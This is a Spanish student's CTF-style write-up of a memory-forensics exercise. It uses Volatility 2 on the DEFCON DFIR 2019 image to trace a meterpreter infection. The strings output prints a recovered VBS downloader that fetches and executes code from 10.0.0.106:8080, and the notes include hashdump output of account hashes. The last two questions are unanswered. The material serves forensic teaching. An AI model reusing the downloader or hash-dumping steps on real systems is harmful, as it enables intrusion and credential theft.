Parte de [[Analisis de RAM]]
## Objetivo

> El objetivo de esta práctica es que el alumno se familiarice con el uso de herramientas de análisis forense y sea capaz de encontrar información relevante a partir de imágenes de memoria. A mayores, el alumno también se familiarizará con los retos CTF y con los writeups que explican cómo llegar a la solución

## Corrección de la práctica y forma de entrega

>Esta práctica no se entrega ni cuenta para la nota final, pero es conveniente realizarla

## Materiales

>Para realizar los siguientes ejercicios necesitará Volatility 2.
>
>El archivo de imagen de memoria al que se refiere el enunciado corresponde al concurso CTF no oficial del DEFCON DFIR 2019. Es el archivo llamado “Triage-Memory.mem” que está disponible en la carpeta S:\ciberCEP\AnaliseFI\Ejercicio3a y en la carpeta de Google Drive:
>
>https://drive.google.com/drive/folders/1JwK8duNnrh12fo9J_02oQCz8HlILKAdW

## Instrucciones

>Instalar Volatility 2 en una máquina virtual Kali limpia. De esta forma se podrán usar comandos como file, strings, grep, sort o awk que ayudarán a trabajar con las salidas generadas por Volatility. Se recomienda de cara a las siguientes prácticas con Volatility tener dos máquinas distintas, una con Volatility 2 y otra con Volatility 3.
>
>Se recomienda dejar al menos 4 GB de RAM y 50 GB de disco e instalar Volatility y siguiendo las instrucciones de los apuntes.

## Ejercicios

>Responder a las siguientes preguntas:

> 1. ¿Cuál es el hash SHA-1 del archivo memory-triage.mem?

c95e8cc8c946f95a109ea8e47a6800de10a27abd

``` bash
shasum -a 1 ~/afi/Triage-Memory.mem

c95e8cc8c946f95a109ea8e47a6800de10a27abd  /home/kali/afi/Triage-Memory.mem
```

> 2. ¿Cuál es el perfil más apropiado para la máquina?

Win7SP1x64

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem imageinfo

Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/afi/Triage-Memory.mem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf800029f80a0L
          Number of Processors : 2
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff800029f9d00L
                KPCR for CPU 1 : 0xfffff880009ee000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-03-22 05:46:00 UTC+0000
     Image local date and time : 2019-03-22 01:46:00 -0400
```

> 3. ¿Cuál es el PID del proceso notepad.exe?

3032

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 pslist | grep notepad

Volatility Foundation Volatility Framework 2.6.1
0xfffffa80054f9060 notepad.exe            3032   1432      1       60      1      0 2019-03-22 05:32:22 UTC+0000  
```

> 4. Nombre del proceso hijo de wscript.exe.

UWkpjFjDzM.exe

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 pstree | grep -A 3 wscript

Volatility Foundation Volatility Framework 2.6.1
.. 0xfffffa8005a80060:wscript.exe                    5116   3952      8    312 2019-03-22 05:35:32 UTC+0000
... 0xfffffa8005a1d9e0:UWkpjFjDzM.exe                3496   5116      5    109 2019-03-22 05:35:33 UTC+0000
.... 0xfffffa8005bb0060:cmd.exe                      4660   3496      1     33 2019-03-22 05:35:36 UTC+0000
. 0xfffffa80054f9060:notepad.exe                     3032   1432      1     60 2019-03-22 05:32:22 UTC+0000
```

Creemos que este proceso esta infectando, dumpealo, crea un hash y compruebalo en VirusTotal.

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 memdump -p 3496 -D ~/afi/

Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing UWkpjFjDzM.exe [  3496] to 3496.dmp


shasum -a 1 ~/afi/3496.dmp
0ae0bf49bb714df8399f46dee164bd3d59d04b40  /home/kali/afi/3496.dmp
```

![[Pasted image 20250217211326.png]]

> 5. ¿Cuál era la dirección IP de la máquina en el momento en el que se hizo la imagen de memoria?

10.0.0.101

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 netscan

Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x13e057300        UDPv4    10.0.0.101:55736               *:*                                   2888     svchost.exe    2019-03-22 05:32:20 UTC+0000
0x13e05b4f0        UDPv6    ::1:55735                      *:*                                   2888     svchost.exe    2019-03-22 05:32:20 UTC+0000
0x13e05b790        UDPv6    fe80::7475:ef30:be18:7807:55734 *:*                                   2888     svchost.exe    2019-03-22 05:32:20 UTC+0000
0x13e05d4b0        UDPv6    fe80::7475:ef30:be18:7807:1900 *:*                                   2888 
```

> 6. Basándose en la respuesta relacionada con el PID infectado, ¿cuál es la IP del atacante?

10.0.0.106

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 netscan | grep UWkpjFjDzM.exe

Volatility Foundation Volatility Framework 2.6.1
0x13e397190        TCPv4    10.0.0.101:49217               10.0.0.106:4444      ESTABLISHED      3496     UWkpjFjDzM.exe 
```

> 7. ¿Cuál es el nombre del proceso relacionado con la librería VCRUNTIME140.dll?

Office

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 dlllist > ~/afi/dllist.txt

Volatility Foundation Volatility Framework 2.6.1


cat ~/afi/dllist.txt | grep VCRUNTIME140.dll

0x000007fefa5c0000            0x16000             0xffff 2019-03-22 05:32:05 UTC+0000   C:\Program Files\Common Files\Microsoft Shared\ClickToRun\VCRUNTIME140.dll
0x00000000745f0000            0x15000             0xffff 2019-03-22 05:33:49 UTC+0000   C:\Program Files (x86)\Microsoft Office\root\Office16\VCRUNTIME140.dll
0x00000000745f0000            0x15000             0xffff 2019-03-22 05:34:37 UTC+0000   C:\Program Files (x86)\Microsoft Office\root\Office16\VCRUNTIME140.dll
0x00000000745f0000            0x15000                0x3 2019-03-22 05:34:49 UTC+0000   C:\Program Files (x86)\Microsoft Office\root\Office16\VCRUNTIME140.dll
0x00000000745f0000            0x15000             0xffff 2019-03-22 05:35:09 UTC+0000   C:\Program Files (x86)\Microsoft Office\root\Office16\VCRUNTIME140.dll
```

> 8. ¿Cuál es el valor del hash MD5 del potencial malware en el sistema?

6654c0ab83bb8fa9cb64c9078c9c8468

``` bash
md5sum ~/afi/3496.dmp

6654c0ab83bb8fa9cb64c9078c9c8468  /home/kali/afi/3496.dmp
```

> 9. ¿Cuál es el hash LM de la cuenta de Bob?

aad3b435b51404eeaad3b435b51404ee (El otro es el NTLM)

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 hashdump

Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Bob:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> 10. Hubo un script VBS corriendo en la máquina. ¿Cuál es el nombre del script (sin extensión)?

Modo 1 con strings (no recomendable):

vhjReUDEuumrX

```bash
strings -a -td ~/afi/Triage-Memory.mem > ~/afi/string_raw.txt

strings -a -td -el ~/afi/Triage-Memory.mem >> ~/afi/string_raw.txt

python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 strings -s ~/afi/string_raw.txt > ~/afi/proc_strings.txt

cat ~/afi/proc_strings.txt | grep -A 2 ".vbs"

890276594 [3952:031c5af2] {.save|%TEMP%\vhjReUDEuumrX.vbs|Set x=CreateObject("Microsoft.XMLHTTP")
890799432 [3952:02182548] wscript.exe //B //NOLOGO %TEMP%\vhjReUDEuumrX.vbs
895821848 [3952:031aa818] /?search=%00{.save%7C%25TEMP%25%5CvhjReUDEuumrX.vbs%7CSet%20x=CreateObject(%22Microsoft.XMLHTTP%22)%0D%0AOn%20Error%20Resume%20Next%0D%0Ax.Open%20%22GET%22,%22http://10.0.0.106:8080/6KqFks7lU7q0%22,False%0D%0AIf%20Err.Number%20%3C%3E%200%20Then%0D%0Awsh.exit%0D%0AEnd%20If%0D%0Ax.Send%0D%0AExecute%20x.responseText.}
```

Modo 2 con cmdline y sabiendo que el proceso wscript.exe es el que ejecuta los virtual basic scripts:

``` bash
python2 vol.py -f ~/afi/Triage-Memory.mem --profile=Win7SP1x64 cmdline -p 5116
Volatility Foundation Volatility Framework 2.6.1

************************************************************************
wscript.exe pid:   5116
Command line : "C:\Windows\System32\wscript.exe" //B //NOLOGO %TEMP%\vhjReUDEuumrX.vbs
```

> 11. ¿Cuál es el nombre corto del archivo en el registro de la MFT 59045?

> 12. Este equipo ha sido comprometido y tiene una sesión de meterpreter. ¿Qué PID ha sido infectado?